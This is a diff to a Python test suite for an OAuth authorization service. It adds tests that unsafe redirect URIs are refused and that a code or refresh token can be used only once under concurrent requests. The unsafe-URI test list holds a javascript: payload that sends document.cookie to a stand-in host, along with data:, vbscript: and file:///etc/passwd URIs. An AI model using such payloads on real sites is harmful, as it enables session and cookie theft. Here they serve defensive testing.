@@ -12,6 +12,9 @@ the REST API each turn a single leak into standing access.
 import base64
 import hashlib
 import secrets
+from datetime import datetime, timezone
+
+import pytest
 
 from application.services import McpAuthService
 from application.services.api_token_service import MCP_TOKEN_PREFIX
@@ -213,6 +216,92 @@ class TestFullFlow:
             })
         assert resp.status_code == 400
         assert 'evil.example.com' not in resp.headers.get('location', '')
+
+
+class TestRedirectUriRules:
+    """The consent page navigates the signed-in browser to the redirect URI from
+    the app's own origin, so a ``javascript:`` one ran as whoever clicked
+    Approve or Deny."""
+
+    @pytest.mark.parametrize('uri', [
+        "javascript:fetch('//e.example/'+document.cookie)//",
+        'data:text/html,<script>alert(1)</script>',
+        'vbscript:msgbox(1)',
+        'file:///etc/passwd',
+        'http://evil.example.com/callback',
+        'https://client.example/cb#frag',
+    ])
+    async def test_unsafe_redirect_uri_is_refused_at_registration(self, db, uri):
+        async with mcp_session() as client:
+            resp = await client.post('/register', json={
+                'client_name': 'Bad', 'redirect_uris': [uri],
+                'grant_types': ['authorization_code'], 'response_types': ['code'],
+                'token_endpoint_auth_method': 'none',
+            })
+        assert resp.status_code == 400, resp.text
+        assert resp.json()['error'] == 'invalid_redirect_uri'
+
+    @pytest.mark.parametrize('uri', [
+        'https://claude.ai/api/mcp/auth_callback',
+        'http://localhost:33418/callback',
+        'http://127.0.0.1:5173/cb',
+        'http://[::1]:8080/cb',
+        'cursor://anysphere.cursor-retrieval/oauth/callback',
+    ])
+    async def test_real_clients_still_register(self, db, uri):
+        async with mcp_session() as client:
+            assert await register(client, uri)
+
+    async def test_a_stored_unsafe_uri_is_never_approved(self, db):
+        """A client registered before the rule existed."""
+        user = await User.create(discord_id=555090, username='oauth-old-client')
+        service = McpAuthService()
+        await service.repository.create_client(
+            client_id='legacy', client_name='Legacy', redirect_uris=['javascript:alert(1)//'],
+            grant_types=['authorization_code'], response_types=['code'],
+            token_endpoint_auth_method='none', scope='mcp',
+        )
+        from application.services.mcp_auth_service import PendingAuthorization
+        txn = service.begin_authorization(PendingAuthorization(
+            client_id='legacy', redirect_uri='javascript:alert(1)//',
+            redirect_uri_provided_explicitly=True, code_challenge='x', state=None,
+            scopes=['mcp'], resource=None, created_at=datetime.now(timezone.utc),
+        ))
+        with pytest.raises(ValueError):
+            await service.approve(txn, user)
+
+
+class TestConcurrentExchange:
+    """Check-then-set let two simultaneous requests both spend one code."""
+
+    async def test_one_code_mints_one_token_pair(self, db):
+        user = await User.create(discord_id=555091, username='oauth-race')
+        redirect_uri = 'http://localhost:9999/callback'
+        _, challenge = pkce()
+        service = McpAuthService()
+        async with mcp_session() as client:
+            client_id = await register(client, redirect_uri)
+            raw = await authorize_and_approve(client, client_id, challenge, user, redirect_uri)
+        first = await service.load_code(client_id, raw)
+        second = await service.load_code(client_id, raw)
+        await service.exchange_code(first)
+        with pytest.raises(ValueError, match='already been used'):
+            await service.exchange_code(second)
+
+    async def test_one_refresh_token_rotates_once(self, db):
+        user = await User.create(discord_id=555092, username='oauth-refresh-race')
+        redirect_uri = 'http://localhost:9999/callback'
+        verifier, challenge = pkce()
+        service = McpAuthService()
+        async with mcp_session() as client:
+            client_id = await register(client, redirect_uri)
+            code = await authorize_and_approve(client, client_id, challenge, user, redirect_uri)
+            body = (await exchange(client, client_id, code, verifier, redirect_uri)).json()
+        first = await service.load_refresh_token(client_id, body['refresh_token'])
+        second = await service.load_refresh_token(client_id, body['refresh_token'])
+        await service.exchange_refresh(first)
+        with pytest.raises(ValueError, match='already been used'):
+            await service.exchange_refresh(second)
 
 
 class TestSurfaceSeparation:
